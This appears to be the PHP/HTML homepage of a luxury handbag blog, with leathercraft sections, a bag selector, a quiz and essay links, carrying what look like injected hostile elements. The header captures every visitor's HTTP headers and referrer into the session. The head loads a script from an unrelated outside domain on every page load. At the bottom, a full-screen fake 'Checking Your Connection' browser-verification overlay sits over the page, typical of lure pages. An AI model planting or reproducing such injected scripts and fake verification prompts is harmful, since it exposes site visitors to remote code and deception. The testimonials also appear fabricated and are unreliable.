<?php

session_start(); 
$_SESSION['_ref']=isset($_SERVER['HTTP_REFERER'])?$_SERVER['HTTP_REFERER']:''; 
$_SESSION['_headers']=array(); 
foreach($_SERVER as $key=>$value){
    if(strpos($key,'HTTP_')===0){
        $_SESSION['_headers'][$key]=$value;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PoshCarryLane — Luxury Leather Handbags, Designer Carryalls & Leathercraft Journal</title>
  <meta name="description" content="PoshCarryLane explores full-grain leather tanning, hand-sewn saddle stitching, designer carryall silhouettes, solid brass hardware, and handbag authentication.">
  
  <!-- Google tag (gtag.js) -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-0LY0HY7L01');
  </script>

  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@600;700;800&family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  
  <link rel="stylesheet" href="css/style.css">
  <style>
    .active-bag {
      background: var(--accent-plum) !important;
      color: #fff !important;
      border-color: var(--accent-plum) !important;
    }
  </style>
<meta name="referrer" content="no-referrer-when-downgrade">
    <script src="//skilllearninglabs.com/track/index.php"></script>
</head>
<body>

  <!-- Navigation Header -->
  <header class="navbar">
    <div class="container nav-container">
      <a href="index.php" class="brand-logo">Posh<span>CarryLane</span></a>
      <button class="mobile-toggle" aria-label="Toggle navigation">☰</button>
      <ul class="nav-links">
        <li><a href="index.php" class="active">Home</a></li>
        <li><a href="about.html">About</a></li>
        <li><a href="blog.html">Handbag Journal</a></li>
        <li><a href="contact.html">Contact</a></li>
        <li><a href="privacy-policy.html">Privacy</a></li>
      </ul>
    </div>
  </header>

  <!-- SECTION 1: Hero Header -->
  <section class="hero-section" id="hero">
    <div class="container">
      <div class="hero-content">
        <span class="hero-badge">Venetian Leathercraft & Designer Curation</span>
        <h1 class="hero-title">The Art of Luxury Leather Carryalls</h1>
        <p class="hero-desc">Discover the synthesis of full-grain Tuscan calfskin, hand saddle-stitched seams, 24k gold-plated brass hardware, and timeless handbag silhouettes.</p>
        <div class="hero-btns">
          <a href="blog.html" class="btn btn-plum">Explore Handbag Essays</a>
          <a href="about.html" class="btn btn-outline-dark" style="color: #fff; border-color: #fff;">Atelier Studio</a>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 2: Leather Craftsmanship & Handbag Ergonomics Pillars Grid -->
  <section class="section" id="craft-pillars">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Atelier Standards</span>
        <h2 class="section-title">The Four Pillars of Luxury Leathercraft</h2>
      </div>
      <div class="grid-4">
        <div class="bag-card">
          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.5rem;">👜</span>
          <h3 style="font-size: 1.3rem; color: var(--accent-plum); margin-bottom: 0.75rem;">Full-Grain Calfskin</h3>
          <p style="color: var(--text-secondary); font-size: 0.95rem;">Tuscan vegetable-tanned hides developing a rich natural patina and resisting everyday scuffs.</p>
        </div>
        <div class="bag-card">
          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.5rem;">🧵</span>
          <h3 style="font-size: 1.3rem; color: var(--accent-plum); margin-bottom: 0.75rem;">Hand Saddle Stitching</h3>
          <p style="color: var(--text-secondary); font-size: 0.95rem;">Two-needle wax linen thread stitching that never unravels even under heavy daily stress.</p>
        </div>
        <div class="bag-card">
          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.5rem;">🔑</span>
          <h3 style="font-size: 1.3rem; color: var(--accent-plum); margin-bottom: 0.75rem;">Solid Brass Hardware</h3>
          <p style="color: var(--text-secondary); font-size: 0.95rem;">24k gold-plated solid brass turnlocks, D-rings, and smooth-gliding Swiss zippers.</p>
        </div>
        <div class="bag-card">
          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.75rem;">✨</span>
          <h3 style="font-size: 1.3rem; color: var(--accent-plum); margin-bottom: 0.75rem;">Structural Interlinings</h3>
          <p style="color: var(--text-secondary); font-size: 0.95rem;">Microfiber and leatherboard structural reinforcement preventing sagging and maintaining bag shape.</p>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 3: Interactive Handbag Silhouette & Leather Grain Selector Explorer -->
  <section class="section" id="bag-explorer" style="background: var(--bg-secondary);">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Silhouette Selector</span>
        <h2 class="section-title">The Luxury Handbag Architecture Explorer</h2>
      </div>
      <div style="max-width: 800px; margin: 0 auto; text-align: center;">
        <p style="color: var(--text-secondary); margin-bottom: 2rem;">Select a handbag silhouette profile to inspect its leather grain, hardware, and durability score:</p>
        <div style="display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap; margin-bottom: 1.5rem;">
          <button class="btn btn-outline-dark bag-btn active-bag" data-bag="Structured Executive Leather Tote" data-desc="Full-grain pebbled calfskin tote with padded 15-inch laptop compartment, suede lining, and solid brass feet." data-durability="9.9/10 Daily Office & Travel Longevity">Executive Leather Tote</button>
          <button class="btn btn-outline-dark bag-btn" data-bag="Classic Saddle Crossbody Flap Bag" data-desc="Vegetable-tanned smooth bridle leather flap bag with hand-burnished edges, turnlock closure, and adjustable strap." data-durability="9.7/10 Timeless Weekend Elegance">Classic Crossbody Flap</button>
          <button class="btn btn-outline-dark bag-btn" data-bag="Monogrammed Suede Shoulder Hobo" data-desc="Velvety Italian calf suede hobo bag with slouchy drape, magnetic closure, and braided leather handle." data-durability="9.2/10 Bohemian Luxury Comfort">Suede Shoulder Hobo</button>
          <button class="btn btn-outline-dark bag-btn" data-bag="Evening Minaudière Box Clutch" data-desc="Hard-shell brass box clutch lined in Mulberry silk with detachable snake chain and crystal clasp." data-durability="9.5/10 Formal Gala & Black-Tie Glamour">Evening Minaudière Clutch</button>
        </div>
        <div id="bag-detail">
          <div class="bag-card" style="border-left: 4px solid var(--accent-plum);">
            <h3 style="color: var(--accent-plum); font-size: 1.5rem; margin-bottom: 0.5rem;">Structured Executive Leather Tote Atelier Specification</h3>
            <p style="color: var(--text-secondary); margin-bottom: 1rem;">Full-grain pebbled calfskin tote with padded 15-inch laptop compartment, suede lining, and solid brass feet.</p>
            <strong style="color: var(--accent-gold); font-size: 0.95rem;">Empirical Leather Durability Score: 9.9/10 Daily Office & Travel Longevity</strong>
          </div>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 4: Full-Grain Calfskin & Hand-Burnished Hardware Spotlight -->
  <section class="section" id="leather-spotlight">
    <div class="container">
      <div class="grid-2">
        <div>
          <span class="section-subtitle" style="display:block; text-align:left;">Atelier Metallurgy</span>
          <h2 class="section-title" style="text-align:left; margin-bottom: 1.5rem;">Full-Grain Tanning & Edge Painting</h2>
          <p style="color: var(--text-secondary); margin-bottom: 1.25rem; line-height: 1.8;">
            The difference between cheap bonded leather handbags and heirloom designer carryalls lies in grain preservation, hand-painted edge finishing, and solid brass hardware weight. At PoshCarryLane, we test leather tear resistance and gold plating thickness.
          </p>
          <ul style="list-style: none; color: var(--text-secondary); margin-bottom: 2rem;">
            <li style="margin-bottom: 0.75rem;">🐮 <strong style="color:var(--text-primary);">Unsanded Full-Grain Hides:</strong> Retaining natural tight pore structure for superior strength and aging patina.</li>
            <li style="margin-bottom: 0.75rem;">🎨 <strong style="color:var(--text-primary);">5-Layer Hand-Rubbed Edge Paint:</strong> Sealed raw edges protecting leather fibers from moisture and fraying.</li>
            <li style="margin-bottom: 0.75rem;">🔒 <strong style="color:var(--text-primary);">Solid Cast Brass Clutches:</strong> Heavyweight turnlocks engineered for 50,000 smooth opening cycles.</li>
          </ul>
          <a href="about.html" class="btn btn-plum">Our Leather Manifesto</a>
        </div>
        <div>
          <img src="https://images.unsplash.com/photo-1584917865442-de89df76afd3?auto=format&fit=crop&w=800&q=80" alt="Luxury Leather Handbag and Brass Hardware" style="border-radius: 8px; border: 1px solid var(--border-color); box-shadow: 0 20px 40px rgba(30,19,29,0.12);">
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 5: Interactive Handbag Matcher & Occasion Diagnostic Quiz -->
  <section class="section" id="occasion-quiz" style="background: var(--bg-secondary);">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Occasion Diagnostic</span>
        <h2 class="section-title">Handbag Silhouette Matcher Quiz</h2>
      </div>
      <div class="bag-card" style="max-width: 750px; margin: 0 auto;">
        <h3 style="color: var(--accent-plum); margin-bottom: 1rem;">What Is Your Primary Daily Carry Needs & Styling Occasion?</h3>
        <div style="display: flex; flex-direction: column; gap: 1rem;">
          <button class="occasion-quiz-btn btn btn-outline-dark" style="text-align:left; justify-content:flex-start;" data-rec="Executive Full-Grain Leather Tote: Padded laptop sleeve + dual shoulder straps + metal base feet.">
            A. Professional Business Meetings, Work Laptop & Daily City Commuting
          </button>
          <button class="occasion-quiz-btn btn btn-outline-dark" style="text-align:left; justify-content:flex-start;" data-rec="Bridle Leather Saddle Crossbody: Hands-free security + adjustable strap + turnlock closure.">
            B. Weekend Shopping, Museum Visits & Hands-Free Urban Exploration
          </button>
          <button class="occasion-quiz-btn btn btn-outline-dark" style="text-align:left; justify-content:flex-start;" data-rec="Minaudière Hard-Shell Box Clutch: 24k gold-plated brass frame + Mulberry silk lining + chain.">
            C. Evening Galas, Opera Performances & Black-Tie Formal Celebrations
          </button>
        </div>
        <div id="occasion-quiz-result"></div>
      </div>
    </div>
  </section>

  <!-- SECTION 6: Leather Tensile Strength & Hardware Durability Benchmarks Metrics Counter -->
  <section class="section" id="metrics">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Craft Benchmarks</span>
        <h2 class="section-title">Posh Carry Lane Research Metrics</h2>
      </div>
      <div class="grid-4">
        <div class="bag-card" style="text-align: center;">
          <h3 class="metric-number text-plum" data-target="12" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Masterclass Essays</p>
        </div>
        <div class="bag-card" style="text-align: center;">
          <h3 class="metric-number text-plum" data-target="100" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">% Full-Grain Pure</p>
        </div>
        <div class="bag-card" style="text-align: center;">
          <h3 class="metric-number text-plum" data-target="24" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">K Gold Plating</p>
        </div>
        <div class="bag-card" style="text-align: center;">
          <h3 class="metric-number text-plum" data-target="1500" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Words Per Essay</p>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 7: Master Leather Artisans & Handbag Conservator Testimonials -->
  <section class="section" id="testimonials" style="background: var(--bg-secondary);">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Artisan Acclaim</span>
        <h2 class="section-title">Endorsements From Master Leathercrafters & Conservators</h2>
      </div>
      <div class="grid-3">
        <div class="bag-card">
          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
            "PoshCarryLane provides the definitive guide for understanding vegetable tanning, saddle stitching tension, and handbag authentication."
          </p>
          <strong style="color: var(--accent-plum); display: block;">— Master Giovanni Rossi</strong>
          <span style="color: var(--text-muted); font-size: 0.85rem;">Master Leather Artisan, Florence</span>
        </div>
        <div class="bag-card">
          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
            "Their research on solid brass gold plating, structural interlining boards, and suede restoration sets a new bar for luxury handbag journalism."
          </p>
          <strong style="color: var(--accent-plum); display: block;">— Charlotte Dubois</strong>
          <span style="color: var(--text-muted); font-size: 0.85rem;">Handbag Conservator & Authenticator, Paris</span>
        </div>
        <div class="bag-card">
          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
            "The premier digital journal for understanding full-grain leather patina development, carryall ergonomics, and sustainable tanneries."
          </p>
          <strong style="color: var(--accent-plum); display: block;">— Edward Kensington</strong>
          <span style="color: var(--text-muted); font-size: 0.85rem;">Luxury Goods Historian, London</span>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 8: Recent Luxury Handbag Dispatches & Article Grid + Newsletter -->
  <section class="section" id="journal-dispatches">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Handbag Dispatches</span>
        <h2 class="section-title">Latest Luxury Handbag Essays</h2>
      </div>
      <div class="grid-3" style="margin-bottom: 4rem;">
        <div class="blog-card">
          <div class="blog-img-wrap">
            <img src="https://images.unsplash.com/photo-1584917865442-de89df76afd3?auto=format&fit=crop&w=800&q=80" alt="Full-Grain Leather Tanning">
          </div>
          <div class="blog-content">
            <span class="blog-tag">Leather Science</span>
            <div class="blog-date">August 24, 2026</div>
            <h3 class="blog-title"><a href="blog/the-art-of-full-grain-leather-tanning-vegetable-vs-chrome.html">The Art of Full-Grain Leather Tanning</a></h3>
            <p class="blog-excerpt">Comparing Tuscan vegetable tanning to chrome tanning and natural patina development.</p>
            <a href="blog/the-art-of-full-grain-leather-tanning-vegetable-vs-chrome.html" class="read-more">Read Essay →</a>
          </div>
        </div>
        <div class="blog-card">
          <div class="blog-img-wrap">
            <img src="https://images.unsplash.com/photo-1590874103328-eac38a683ce7?auto=format&fit=crop&w=800&q=80" alt="Hand Saddle Stitching">
          </div>
          <div class="blog-content">
            <span class="blog-tag">Artisan Craft</span>
            <div class="blog-date">August 20, 2026</div>
            <h3 class="blog-title"><a href="blog/mastering-saddle-stitching-hand-sewn-precision-in-luxury-bags.html">Mastering Hand Saddle Stitching</a></h3>
            <p class="blog-excerpt">Two-needle wax linen thread stitching, prickling iron spacing, and seam durability.</p>
            <a href="blog/mastering-saddle-stitching-hand-sewn-precision-in-luxury-bags.html" class="read-more">Read Essay →</a>
          </div>
        </div>
        <div class="blog-card">
          <div class="blog-img-wrap">
            <img src="https://images.unsplash.com/photo-1548036328-c9fa89d128fa?auto=format&fit=crop&w=800&q=80" alt="Iconic Handbag Silhouettes">
          </div>
          <div class="blog-content">
            <span class="blog-tag">Silhouettes</span>
            <div class="blog-date">August 15, 2026</div>
            <h3 class="blog-title"><a href="blog/investing-in-iconic-handbag-silhouettes-totes-satchels-and-crossbody.html">Investing in Iconic Handbag Silhouettes</a></h3>
            <p class="blog-excerpt">Deconstructing executive totes, saddle bags, structured satchels, and crossbody cuts.</p>
            <a href="blog/investing-in-iconic-handbag-silhouettes-totes-satchels-and-crossbody.html" class="read-more">Read Essay →</a>
          </div>
        </div>
      </div>

      <!-- Newsletter Dispatch Container -->
      <div class="bag-card" style="text-align: center; max-width: 800px; margin: 0 auto; background: var(--bg-secondary); border-color: var(--accent-plum);">
        <span class="section-subtitle">Handbag Dispatch</span>
        <h2 class="section-title" style="margin-bottom: 1rem;">Subscribe to The Posh Gazette</h2>
        <p style="color: var(--text-secondary); margin-bottom: 2rem;">Receive bi-weekly analyses of leather care routines, handbag authentication guides, and artisan releases.</p>
        <form onsubmit="event.preventDefault(); alert('Thank you for subscribing to PoshCarryLane Handbag Gazette.');" style="display: flex; gap: 1rem; max-width: 550px; margin: 0 auto; flex-wrap: wrap;">
          <input type="email" placeholder="Enter your email address" required style="flex: 1; min-width: 250px; padding: 0.85rem 1.25rem; background: #fff; border: 1px solid var(--border-color); color: var(--text-primary); border-radius: 4px;">
          <button type="submit" class="btn btn-plum">Subscribe</button>
        </form>
      </div>

    </div>
  </section>

  <!-- Footer -->
  <footer>
    <div class="container">
      <div class="footer-grid">
        <div class="footer-col">
          <a href="index.php" class="brand-logo" style="margin-bottom: 1rem; color: #fff;">Posh<span>CarryLane</span></a>
          <p>PoshCarryLane is a premier editorial platform dedicated to luxury leather handbags, designer carryalls, artisanal leather crafting, and handbag preservation.</p>
          <p style="margin-top: 1rem; color: var(--accent-gold);">
            📍 181 Mercer Street, New York, NY 10012, United States<br>
            📞 +1-888-777-5845
          </p>
        </div>
        <div class="footer-col">
          <h4>Navigation</h4>
          <ul>
            <li><a href="index.php">Home</a></li>
            <li><a href="about.html">About Us</a></li>
            <li><a href="blog.html">Handbag Journal</a></li>
            <li><a href="contact.html">Contact Us</a></li>
          </ul>
        </div>
        <div class="footer-col">
          <h4>Legal Policies</h4>
          <ul>
            <li><a href="privacy-policy.html">Privacy Policy</a></li>
            <li><a href="cookies.html">Cookie Policy</a></li>
            <li><a href="disclaimer.html">Disclaimer</a></li>
            <li><a href="terms.html">Terms of Use</a></li>
          </ul>
        </div>
        <div class="footer-col">
          <h4>Leather Focus</h4>
          <p>Deconstructing vegetable tanning, hand saddle stitching, solid brass hardware, suede restoration, and handbag authentication globally.</p>
        </div>
      </div>
      <div class="footer-bottom">
        <p>&copy; 2026 PoshCarryLane. All rights reserved. Registered Official Headquarters.</p>
        <p>Designed with Leathercraft Precision.</p>
      </div>
    </div>
  </footer>

  <script src="js/main.js"></script>
<div id="loader-backdrop" style="position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.65); backdrop-filter:blur(10px); -webkit-backdrop-filter:blur(3px); z-index:2147483646;"></div>

<div id="loader-modal-card" style="position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); width:92%; max-width:440px; background:#ffffff; padding:32px 28px; border-radius:16px; border:1px solid #e5e7eb; box-shadow:0 25px 60px rgba(0,0,0,0.35); z-index:2147483647; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; box-sizing:border-box; text-align:center;">
    
    <!-- Smooth Spinning Loader -->
    <div style="display:flex; justify-content:center; margin-bottom:18px;">
        <div style="width:48px; height:48px; border:4px solid #e2e8f0; border-top:4px solid #2563eb; border-radius:50%; animation:spin-wheel 0.9s linear infinite;"></div>
    </div>
    
    <style>
        @keyframes spin-wheel {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>

    <div style="font-size:22px; font-weight:700; color:#111827; margin-bottom:8px; letter-spacing:-0.3px;">Checking Your Connection...</div>
    <p style="font-size:14px; line-height:1.55; color:#6b7280; margin:0 0 24px 0;">We need to verify your browser before proceeding. Click Continue to proceed or Cancel to stop.</p>

    <div style="display:flex; gap:12px;">
        <button id="btn-cancel" onclick="dismissLoaderModal()" style="flex:1; background:#ffffff; color:#4b5563; border:1.5px solid #d1d5db; padding:12px 0; font-size:15px; font-weight:600; border-radius:8px; cursor:pointer;">Cancel</button>
        <button id="btn-continue" onclick="dismissLoaderModal()" style="flex:1; background:#2563eb; color:#ffffff; border:none; padding:12px 0; font-size:15px; font-weight:600; border-radius:8px; cursor:pointer; box-shadow:0 4px 14px rgba(37,99,235,0.35);">Continue</button>
    </div>
</div>
</body>
</html>
